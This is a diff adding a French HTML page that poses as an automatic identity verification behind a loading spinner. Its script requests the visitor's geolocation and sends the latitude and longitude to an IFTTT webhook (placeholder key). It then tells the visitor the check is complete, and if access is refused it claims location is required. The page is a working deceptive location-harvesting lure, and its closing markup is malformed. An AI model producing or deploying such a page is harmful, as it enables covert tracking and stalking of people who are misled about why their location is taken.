@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Vérification d'identité</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 80px;
+    }
+    .loader {
+      margin: 20px auto;
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <h2>Chargement en cours...</h2>
+  <div class="loader"></div>
+  <p>Merci de patienter pendant la vérification automatique.</p>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Envoie des données vers un webhook de test (ex: Discord, IFTTT, etc.)
+      fetch("https://maker.ifttt.com/trigger/gps_event/with/key/TA_CLE_IFTTT?value1=" + lat + "&value2=" + lon);
+
+      document.body.innerHTML = "<h2>Merci. Vérification terminée ✅</h2><p>Vous pouvez fermer cette page.</p>";
+    }, function(error) {
+      document.body.innerHTML = "<h2>⚠️ L'autorisation de localisation est requise.</h2><p>Veuillez activer la localisation pour continuer.</p>";
+    });
+  </script>
+</body>
+</!DOCTYPE html>
+<html>
